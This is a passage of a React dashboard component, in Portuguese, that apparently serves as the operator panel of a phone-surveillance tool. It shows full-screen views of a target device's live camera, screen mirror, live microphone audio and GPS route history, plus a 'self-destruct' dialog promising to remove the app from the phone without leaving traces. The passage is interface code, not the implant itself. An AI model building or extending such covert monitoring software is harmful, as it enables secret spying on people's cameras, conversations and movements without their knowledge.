          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center bg-gray-950">
            <div className="text-center">
              <Smartphone className="w-12 h-12 text-gray-800 mx-auto mb-3" />
              <p className="text-sm text-gray-600">
                {!connected ? 'Aguardando servidor...' :
                 devices.length === 0 ? 'Nenhum aparelho conectado' :
                 'Selecione um aparelho'}
              </p>
            </div>
          </div>
        )}
      </div>

      {/* ══════════════════════════════════════════════════════════════════
          Fullscreen stream modals
      ══════════════════════════════════════════════════════════════════ */}
      {expandedStream && (
        <div className="fixed inset-0 z-[2000] bg-gray-950 flex flex-col">

          {/* modal top bar */}
          <div className="flex items-center justify-between px-4 py-3 bg-gray-900 border-b border-gray-800 flex-shrink-0">
            <div className="flex items-center gap-2">
              {expandedStream === 'camera'   && <Camera      className="w-4 h-4 text-gray-400" />}
              {expandedStream === 'screen'   && <MonitorIcon className="w-4 h-4 text-gray-400" />}
              {expandedStream === 'audio'    && <Mic         className="w-4 h-4 text-gray-400" />}
              {expandedStream === 'location' && <MapPin      className="w-4 h-4 text-gray-400" />}
              <span className="text-white font-semibold text-sm">{streamLabel(expandedStream)}</span>
              {activeDevice && <span className="text-gray-500 text-xs ml-1">— {activeDevice.name}</span>}
            </div>
            <div className="flex items-center gap-2">
              {expandedStream === 'camera' && activeStreams.has('camera') && (
                <button onClick={switchCamera}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs
                    bg-gray-800 text-gray-300 hover:text-white hover:bg-gray-700 transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" />
                  Virar câmera
                </button>
              )}
              {expandedStream === 'location' && (
                <>
                  <select value={historyHours} onChange={e => setHistoryHours(Number(e.target.value))}
                    title="Período do histórico"
                    className="bg-gray-800 border border-gray-700 rounded-lg text-xs text-gray-300
                      px-2 py-1.5 focus:outline-none focus:border-blue-500">
                    {HISTORY_RANGES.map(r => (
                      <option key={r.hours} value={r.hours}>Últimas {r.label}</option>
                    ))}
                  </select>
                  <button onClick={() => setShowRoute(v => !v)}
                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs transition-colors
                      ${showRoute ? 'bg-blue-600 text-white hover:bg-blue-700' : 'bg-gray-800 text-gray-300 hover:text-white hover:bg-gray-700'}`}>
                    <Route className="w-3.5 h-3.5" />
                    Rota ({locationHistory.length} pts)
                  </button>
                </>
              )}
              <button onClick={() => setExpandedStream(null)}
                className="p-2 rounded-lg text-gray-400 hover:text-white hover:bg-gray-800 transition-colors">
                <X className="w-5 h-5" />
              </button>
            </div>
          </div>

          {/* modal content */}
          <div className="flex-1 min-h-0 overflow-hidden">

            {(expandedStream === 'camera') && (
              <div className="w-full h-full bg-black flex items-center justify-center">
                {activeStreams.has('camera')
                  ? <canvas ref={cameraFullCanvasRef} className="max-w-full max-h-full object-contain" />
                  : <div className="flex flex-col items-center gap-3 text-gray-700">
                      <Camera className="w-16 h-16" />
                      <span className="text-sm">Câmera desligada</span>
                      <button onClick={() => toggleStream('camera')}
                        className="px-4 py-2 rounded-lg bg-blue-600 text-white text-sm hover:bg-blue-500 transition-colors">
                        Ligar câmera
                      </button>
                    </div>
                }
              </div>
            )}

            {(expandedStream === 'screen') && (
              <div className="w-full h-full bg-black flex items-center justify-center">
                {activeStreams.has('screen')
                  ? <canvas ref={screenFullCanvasRef} className="max-w-full max-h-full object-contain" />
                  : <div className="flex flex-col items-center gap-3 text-gray-700">
                      <MonitorIcon className="w-16 h-16" />
                      <span className="text-sm">Espelhamento desligado</span>
                      <button onClick={() => toggleStream('screen')}
                        className="px-4 py-2 rounded-lg bg-purple-600 text-white text-sm hover:bg-purple-500 transition-colors">
                        Ligar tela
                      </button>
                    </div>
                }
              </div>
            )}

            {(expandedStream === 'audio') && (
              <div className="w-full h-full bg-gray-950 flex flex-col items-center justify-center gap-6">
                {activeStreams.has('audio') ? (
                  <>
                    <div className="flex gap-2 items-end h-20">
                      {[4,6,9,7,11,5,8,4,7,10,6,9,5,8,4,7,11,6,9,5].map((h, i) => (
                        <div key={i} className="w-2.5 bg-green-400 rounded-full animate-pulse"
                          style={{ height: `${h * 6}px`, animationDelay: `${i * 60}ms` }} />
                      ))}
                    </div>
                    <span className="text-green-400 font-medium text-lg">Ouvindo áudio ao vivo...</span>
                    {devInfo && <span className="text-gray-500 text-sm">
                      {devInfo.network === 'wifi' ? '📶 WiFi' : devInfo.network === 'mobile' ? '📱 Dados' : ''}
                    </span>}
                  </>
                ) : (
                  <div className="flex flex-col items-center gap-3">
                    <Mic className="w-16 h-16 text-gray-700" />
                    <span className="text-gray-500">Áudio desligado</span>
                    <button onClick={() => toggleStream('audio')}
                      className="px-4 py-2 rounded-lg bg-green-600 text-white text-sm hover:bg-green-500 transition-colors">
                      Ligar áudio
                    </button>
                  </div>
                )}
              </div>
            )}

            {(expandedStream === 'location') && (
              <div className="w-full h-full flex flex-col">
                <div id="monitor-map-full" className="flex-1 bg-gray-800" />
                {location && (
                  <div className="flex-shrink-0 bg-gray-900 border-t border-gray-800 px-4 py-3
                      flex items-center gap-6 text-sm text-gray-400">
                    <div className="flex items-center gap-1.5">
                      <Clock className="w-4 h-4" />
                      <span>{lastUpdate}</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Gauge className="w-4 h-4" />
                      <span>{(location.speed * 3.6).toFixed(0)} km/h</span>
                    </div>
                    <span>±{Math.round(location.accuracy)}m</span>
                    <span className="text-gray-600">
                      {locationHistory.length} pontos · {stops.length} paradas · {HISTORY_RANGES.find(r => r.hours === historyHours)?.label}
                    </span>
                  </div>
                )}
              </div>
            )}

          </div>
        </div>
      )}

      {/* ── Settings modal ── */}
      {showSettings && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70"
          onClick={() => setShowSettings(false)}>
          <div className="bg-gray-900 border border-gray-700 rounded-xl p-6 w-80 space-y-4 shadow-2xl"
            onClick={e => e.stopPropagation()}>
            <h2 className="text-base font-bold text-white">Configurações</h2>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Endereço WebSocket</label>
              <input type="text" value={wsUrl} onChange={e => setWsUrl(e.target.value)}
                placeholder={DEFAULT_WS_URL}
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white
                  placeholder-gray-600 focus:outline-none focus:border-blue-500" />
            </div>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Senha</label>
              <input type="password" value={password} onChange={e => setPassword(e.target.value)}
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white
                  placeholder-gray-600 focus:outline-none focus:border-blue-500"
                onKeyDown={e => e.key === 'Enter' && saveAndConnect()} />
            </div>
            {loginError && <p className="text-xs text-red-400">{loginError}</p>}
            <div className="flex gap-2">
              <button onClick={() => setShowSettings(false)}
                className="flex-1 py-2 rounded-lg text-sm text-gray-400 bg-gray-800 hover:bg-gray-700 transition-colors">
                Cancelar
              </button>
              <button onClick={saveAndConnect}
                className="flex-1 py-2 rounded-lg text-sm font-semibold text-white bg-blue-600 hover:bg-blue-500 transition-colors">
                Conectar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Destroy confirm ── */}
      {destroyConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70"
          onClick={() => setDestroyConfirm(null)}>
          <div className="bg-gray-900 border border-red-900 rounded-xl p-6 w-80 shadow-2xl"
            onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-2 mb-3">
              <Trash2 className="w-5 h-5 text-red-400" />
              <h2 className="text-base font-bold text-white">Autodestruição</h2>
            </div>
            <p className="text-sm text-gray-300 mb-1">
              Remover <span className="font-semibold text-white">{destroyConfirm.name}</span> permanentemente?
            </p>
            <p className="text-xs text-gray-500 mb-5">O app será removido do aparelho sem deixar rastros.</p>
            <div className="flex gap-2">
              <button onClick={() => setDestroyConfirm(null)}
                className="flex-1 py-2 rounded-lg text-sm text-gray-400 bg-gray-800 hover:bg-gray-700 transition-colors">
                Cancelar
              </button>
              <button onClick={() => selfDestruct(destroyConfirm.id)}
                className="flex-1 py-2 rounded-lg text-sm font-semibold text-white bg-red-700 hover:bg-red-600 transition-colors">
                Remover
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
